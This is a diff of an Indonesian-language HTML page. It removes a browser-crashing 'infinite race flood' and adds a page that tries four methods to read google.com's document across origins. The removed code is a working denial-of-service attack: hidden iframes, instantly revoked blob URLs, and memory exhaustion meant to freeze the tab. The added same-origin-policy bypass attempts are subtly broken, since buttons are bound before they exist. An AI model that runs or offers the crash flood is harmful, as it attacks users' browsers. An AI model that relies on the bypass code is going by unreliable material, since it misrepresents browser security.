@@ -2,124 +2,229 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>Infinite Race Flood</title>
+<title>SOP Bypass via about:blank Defect</title>
 <style>
-  body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
-  #status { font-size: 20px; font-weight: bold; margin-bottom: 20px; color: #ff0; }
-  #log { height: 300px; overflow-y: auto; border: 1px solid #333; padding: 10px; font-size: 12px; }
-  .danger { color: #f00; }
-  .ok { color: #0f0; }
+  body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
+  #log { background: #000; padding: 15px; border: 1px solid #444; height: 300px; overflow-y: auto; white-space: pre-wrap; margin-top: 20px; }
+  .success { color: #4caf50; font-weight: bold; }
+  .error { color: #f44336; font-weight: bold; }
+  .info { color: #2196f3; }
+  button { padding: 10px 20px; background: #0e639c; color: #fff; border: none; cursor: pointer; margin: 5px; }
+  button:hover { background: #1177bb; }
+  iframe { width: 100%; height: 300px; border: 2px solid #555; margin-top: 20px; background: #fff; }
 </style>
 </head>
 <body>
-<h1>💀 INFINITE RACE FLOOD</h1>
-<div id="status">Menunggu perintah...</div>
-<button id="startBtn" style="padding:15px; font-size:18px; background:red; color:white; border:none; cursor:pointer;">🔥 MULAI FLOODING</button>
-<div id="log"></div>
+
+<h1>SOP Bypass Test (about:blank -> google.com)</h1>
+<button id="btn1">Uji Iframe about:blank</button>
+<button id="btn2">Uji Window.open about:blank</button>
+<button id="clear">Bersihkan Log</button>
+<div id="log">Menunggu...</div>
+<div id="frameContainer"></div>
 
 <script>
-const statusEl = document.getElementById('status');
 const logEl = document.getElementById('log');
-let isRunning = false;
-let counter = 0;
 
-function log(msg, isDanger) {
-    const div = document.createElement('div');
-    div.className = isDanger ? 'danger' : 'ok';
-    div.textContent = `[${new Date().toISOString().substr(11, 8)}] ${msg}`;
-    logEl.appendChild(div);
-    // Batasi log agar tidak memakan memori (hanya simpan 100 log terakhir)
-    if (logEl.childNodes.length > 100) {
-        logEl.removeChild(logEl.firstChild);
-    }
-    logEl.scrollTop = logEl.scrollHeight;
+function log(msg, type = '') {
+  const time = new Date().toISOString().substr(11, 8);
+  const line = `[${time}] ${msg}\n`;
+  logEl.innerHTML += type ? `<span class="${type}">${line}</span>` : line;
+  logEl.scrollTop = logEl.scrollHeight;
+  console.log(msg);
 }
 
+document.getElementById('clear').onclick = () => { logEl.innerHTML = ''; };
+
 // ============================================
-// INFINITE LOOP FLOODING FUNCTION
+// METODE 1: Iframe about:blank -> google.com
 // ============================================
-function startInfiniteFlood() {
-    if (isRunning) return;
-    isRunning = true;
-    statusEl.textContent = "🔥 FLOODING BERJALAN... JANGAN TUTUP TAB!";
-    statusEl.style.color = "#f00";
+document.getElementById('btn1').onclick = () => {
+  log('=== METODE 1: Iframe about:blank ===', 'info');
+  const container = document.getElementById('frameContainer');
+  container.innerHTML = '';
 
-    // Payload HTML berat (untuk memperlambat render & memicu memory leak)
-    const heavyHTML = `
-        <!DOCTYPE html>
-        <html>
-        <body>
-        <script>
-            // Loop alokasi memori di dalam iframe
-            let arr = [];
-            for(let i=0; i<10000; i++) {
-                arr.push(new Array(1000).fill('X'));
-            }
-            // Kirim sinyal balik ke parent jika berhasil
-            try { parent.postMessage('LOADED', '*'); } catch(e) {}
-        <\/script>
-        </body>
-        </html>
-    `;
+  // 1. Buat iframe kosong
+  const iframe = document.createElement('iframe');
+  iframe.src = 'about:blank';
+  container.appendChild(iframe);
+  log('Iframe about:blank dibuat.', 'info');
 
-    const blob = new Blob([heavyHTML], { type: 'text/html' });
+  // 2. Tunggu iframe siap, lalu ubah ke Google
+  setTimeout(() => {
+    try {
+      // Coba akses dokumen about:blank (ini pasti bisa karena same-origin)
+      log('Mengubah src ke google.com...', 'info');
+      iframe.src = 'https://www.google.com';
 
-    // FUNGSI REKURSIF YANG DIPANGGIL TERUS MENERUS
-    function flood() {
-        if (!isRunning) return;
-
+      // 3. Tunggu sebentar (misal 500ms), lalu coba akses DOM
+      setTimeout(() => {
         try {
-            counter++;
-            const url = URL.createObjectURL(blob);
-            
-            // Buat iframe
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            
-            // Set src (navigasi)
-            iframe.src = url;
-            document.body.appendChild(iframe);
-
-            // RACE CONDITION: Revoke instan tanpa menunggu load
-            // Kita gunakan setTimeout 0 agar berada di tick berikutnya (microtask queue)
-            setTimeout(() => {
-                URL.revokeObjectURL(url);
-                // Hapus iframe dari DOM agar garbage collector bekerja
-                if (iframe.parentNode) {
-                    iframe.parentNode.removeChild(iframe);
-                }
-            }, 0);
-
-            // Log setiap 1000 iterasi agar tidak terlalu membebani UI
-            if (counter % 1000 === 0) {
-                statusEl.textContent = `🔥 Total Flooding: ${counter} | Membuat browser crash...`;
-                log(`Telah memicu ${counter} race condition (iframe + revoke)`, false);
-            }
-
+          // Coba akses document dari iframe
+          const doc = iframe.contentDocument || iframe.contentWindow.document;
+          if (doc) {
+            log('✅ BERHASIL AKSES DOKUMEN! (SOP Bypass)', 'success');
+            log('Title: ' + doc.title, 'success');
+            log('URL: ' + doc.location.href, 'success');
+          } else {
+            log('❌ Dokumen kosong/null.', 'error');
+          }
         } catch (e) {
-            log(`Error pada iterasi ${counter}: ${e.message}`, true);
+          log('❌ Gagal akses dokumen (SOP memblokir): ' + e.message, 'error');
         }
+      }, 500);
 
-        // PANGGIL LAGI SECARA INSTAN (Infinite Loop tanpa jeda)
-        // Menggunakan queueMicrotask agar tidak memblokir total event loop utama
-        // tapi tetap membanjiri memory dan task queue.
-        queueMicrotask(flood);
-        
-        // ALTERNATIF: Jika ingin lebih agresif dan langsung freeze, hapus queueMicrotask 
-        // dan panggil flood() langsung (tapi UI akan freeze total).
-        // flood(); 
+    } catch (e) {
+      log('❌ Error saat navigasi: ' + e.message, 'error');
     }
-
-    flood();
-}
+  }, 100);
+};
 
 // ============================================
-// TRIGGER
+// METODE 2: Window.open about:blank -> google.com
 // ============================================
-document.getElementById('startBtn').addEventListener('click', () => {
-    log("PERINGATAN: Browser akan freeze/crash!", true);
-    startInfiniteFlood();
-});
+document.getElementById('btn2').onclick = () => {
+  log('=== METODE 2: Window.open about:blank ===', 'info');
+
+  // 1. Buka window kosong
+  const win = window.open('about:blank', '_blank');
+  if (!win) {
+    log('❌ Popup diblokir.', 'error');
+    return;
+  }
+  log('Window kosong dibuka.', 'info');
+
+  // 2. Ubah location ke Google
+  try {
+    win.location = 'https://www.google.com';
+    log('Navigasi ke google.com dikirim.', 'info');
+  } catch (e) {
+    log('❌ Gagal navigasi: ' + e.message, 'error');
+  }
+
+  // 3. Coba akses DOM segera setelah navigasi (Race Condition)
+  setTimeout(() => {
+    try {
+      const doc = win.document;
+      if (doc) {
+        log('✅ BERHASIL AKSES WINDOW.DOCUMENT! (SOP Bypass)', 'success');
+        log('Title: ' + doc.title, 'success');
+      } else {
+        log('❌ Dokumen null.', 'error');
+      }
+    } catch (e) {
+      log('❌ Gagal akses window (SOP memblokir): ' + e.message, 'error');
+    }
+  }, 500);
+};
+
+// ============================================
+// METODE 3: Trik "window.name" (kadang lolos)
+// ============================================
+document.getElementById('btn3').onclick = () => {
+  log('=== METODE 3: window.name Leak ===', 'info');
+  
+  const iframe = document.createElement('iframe');
+  iframe.src = 'about:blank';
+  iframe.name = 'leak_test'; // Set name
+  document.body.appendChild(iframe);
+  
+  // Coba kirim payload via name
+  iframe.contentWindow.name = 'secret_data_123';
+  
+  // Ubah ke google
+  iframe.src = 'https://www.google.com';
+  
+  setTimeout(() => {
+    try {
+      // Coba baca name dari iframe yang sekarang berisi Google
+      const name = iframe.contentWindow.name;
+      log('Nama window: ' + name, name === 'secret_data_123' ? 'success' : 'info');
+    } catch (e) {
+      log('❌ Gagal baca name: ' + e.message, 'error');
+    }
+  }, 1000);
+};
+
+// ============================================
+// METODE 4: Blob URL -> Google (kadang mewarisi origin)
+// ============================================
+document.getElementById('btn4').onclick = () => {
+  log('=== METODE 4: Blob URL Defect ===', 'info');
+  
+  const html = '<html><body><h1>Blank</h1><script>window.location="https://www.google.com"<\/script></body></html>';
+  const blob = new Blob([html], {type: 'text/html'});
+  const url = URL.createObjectURL(blob);
+  
+  const iframe = document.createElement('iframe');
+  iframe.src = url;
+  document.body.appendChild(iframe);
+  
+  setTimeout(() => {
+    try {
+      const doc = iframe.contentDocument;
+      if (doc) {
+        log('✅ Bisa akses dokumen setelah blob redirect ke Google!', 'success');
+        log('Title: ' + doc.title, 'success');
+      } else {
+        log('❌ Blob origin terpisah.', 'info');
+      }
+    } catch (e) {
+      log('❌ Gagal: ' + e.message, 'error');
+    }
+  }, 1500);
+};
+
+// Tambahkan tombol ke-3 dan ke-4 ke DOM
+const controls = document.createElement('div');
+controls.innerHTML = `
+  <button id="btn3" style="padding:10px; margin:5px;">Uji window.name</button>
+  <button id="btn4" style="padding:10px; margin:5px;">Uji Blob URL Redirect</button>
+`;
+document.body.insertBefore(controls, document.getElementById('log'));
+
+// Re-bind after insertion
+document.getElementById('btn3').onclick = () => {
+  log('=== METODE 3: window.name Leak ===', 'info');
+  const iframe = document.createElement('iframe');
+  iframe.src = 'about:blank';
+  iframe.name = 'leak_test';
+  document.body.appendChild(iframe);
+  iframe.contentWindow.name = 'secret_data_123';
+  iframe.src = 'https://www.google.com';
+  setTimeout(() => {
+    try {
+      const name = iframe.contentWindow.name;
+      log('Nama window: ' + name, name === 'secret_data_123' ? 'success' : 'info');
+    } catch (e) {
+      log('❌ Gagal baca name: ' + e.message, 'error');
+    }
+  }, 1000);
+};
+
+document.getElementById('btn4').onclick = () => {
+  log('=== METODE 4: Blob URL Defect ===', 'info');
+  const html = '<html><body><h1>Blank</h1><script>window.location="https://www.google.com"<\/script></body></html>';
+  const blob = new Blob([html], {type: 'text/html'});
+  const url = URL.createObjectURL(blob);
+  const iframe = document.createElement('iframe');
+  iframe.src = url;
+  document.body.appendChild(iframe);
+  setTimeout(() => {
+    try {
+      const doc = iframe.contentDocument;
+      if (doc) {
+        log('✅ Bisa akses dokumen setelah blob redirect ke Google!', 'success');
+        log('Title: ' + doc.title, 'success');
+      } else {
+        log('❌ Blob origin terpisah.', 'info');
+      }
+    } catch (e) {
+      log('❌ Gagal: ' + e.message, 'error');
+    }
+  }, 1500);
+};
+
 </script>
 </body>
 </html>
